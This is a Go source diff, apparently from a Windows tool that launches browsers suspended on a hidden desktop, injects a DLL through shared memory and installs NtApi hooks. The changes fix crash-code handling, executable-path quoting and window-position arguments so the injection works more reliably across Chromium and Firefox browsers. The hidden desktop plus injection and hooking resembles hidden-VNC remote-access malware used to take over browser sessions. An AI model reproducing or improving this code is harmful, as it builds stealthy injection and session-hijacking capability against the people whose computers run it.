@@ -127,7 +127,7 @@ func describeExitCode(code uint32) string {
 	case 21:
 		return "exit code 0x15 (21) — another instance is already running with this user data / profile"
 	case 17:
-		return "exit code 0x11 (17) — handed off to an already-running instance"
+		return "exit code 0x11 (17) — handed off to an already-running browser instance"
 	default:
 		return fmt.Sprintf("exit code 0x%X (%d)", code, code)
 	}
@@ -159,9 +159,11 @@ func monitorProcessCrash(pid uint32, label string, notify func(step string, succ
 
 	// Chromium resolves "already running" conflicts by exiting with a handoff
 	// code (17/21) instead of faulting. When the injected instance was preceded
-	// by live Chrome holding the same profile, this is expected single-instance
-	// behavior — report it as an informational handoff, not a crash.
-	if (exitCode == 17 || exitCode == 21) && strings.Contains(strings.ToLower(label), "chrome") {
+	// by a live browser holding the same profile, this is expected single-
+	// instance behavior — report it as an informational handoff, not a crash.
+	// This applies to every Chromium browser (Chrome, Brave, Edge, Opera,
+	// Vivaldi, Yandex, Arc), not just Chrome.
+	if exitCode == 17 || exitCode == 21 {
 		notify("handoff", true, fmt.Sprintf("%s (PID %d) handed off to an existing instance — %s", label, pid, describeExitCode(exitCode)))
 		return
 	}
@@ -1084,7 +1086,9 @@ func startbackstageProcessInjectedOnThread(filePath string, dllBytes []byte, sea
 
 	// The DLL's InstallNtApiHooks has run (injectIntoProcess waits for the
 	// injector thread to finish, so DllMain already opened the shared section).
-	// We can release our handle now.
+	// DllMain keeps its own section handle open for the process lifetime, so
+	// Chromium children created later can still open it after we release this
+	// parent handle.
 	procCloseHandle.Call(shmHandle)
 
 	procCloseHandle.Call(hProcess)
@@ -1257,6 +1261,13 @@ func createDLLSharedMemory(dllBytes []byte) (handle uintptr, name string, err er
 	return handle, name, nil
 }
 
+// quoteWindowsExecutablePath quotes argv[0] for CreateProcessW when
+// lpApplicationName is NULL.  Existing surrounding quotes are stripped first so
+// callers may pass either form.
+func quoteWindowsExecutablePath(path string) string {
+	return `"` + strings.Trim(path, `"`) + `"`
+}
+
 func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName string, dllSize int, display int) (hProcess, hThread uintptr, pid uint32, err error) {
 	desktopNamePtr, err := syscall.UTF16PtrFromString(backstageDesktopName)
 	if err != nil {
@@ -1267,7 +1278,6 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 		posX = mons[display].rect.Min.X
 		posY = mons[display].rect.Min.Y
 	}
-	args := fmt.Sprintf(" --window-position=%d,%d", posX, posY)
 	chromiumExes := map[string]bool{
 		"chrome.exe":  true,
 		"brave.exe":   true,
@@ -1278,12 +1288,23 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 		"arc.exe":     true,
 	}
 	baseName := strings.ToLower(filepath.Base(filePath))
-	if chromiumExes[baseName] {
-		args += " "
-	} else if baseName == "firefox.exe" || baseName == "waterfox.exe" {
-		args += " -no-remote -wait-for-browser"
+	args := ""
+	switch {
+	case chromiumExes[baseName]:
+		// Chromium ignores STARTUPINFO positioning in some versions; the
+		// command-line switch keeps the window on the hidden display.
+		args = fmt.Sprintf(" --window-position=%d,%d ", posX, posY)
+	case baseName == "firefox.exe" || baseName == "waterfox.exe":
+		args = " -no-remote -wait-for-browser"
 	}
-	cmdLine, err := syscall.UTF16FromString(filePath + args)
+	// For every other application, do not invent command-line arguments.  The
+	// old code always appended --window-position, which non-Chromium apps treat
+	// as a filename (e.g. notepad would try to open a file with that name).
+	// CreateProcessW is called with a NULL lpApplicationName, so argv[0] must
+	// be a quoted path.  Chrome/Edge/Firefox all live under "Program Files"
+	// (or "%LOCALAPPDATA%\..."), i.e. paths that contain spaces; without the
+	// quotes CreateProcess tries to launch e.g. "C:\Program.exe".
+	cmdLine, err := syscall.UTF16FromString(quoteWindowsExecutablePath(filePath) + args)
 	if err != nil {
 		return 0, 0, 0, fmt.Errorf("failed to convert command line: %v", err)
 	}
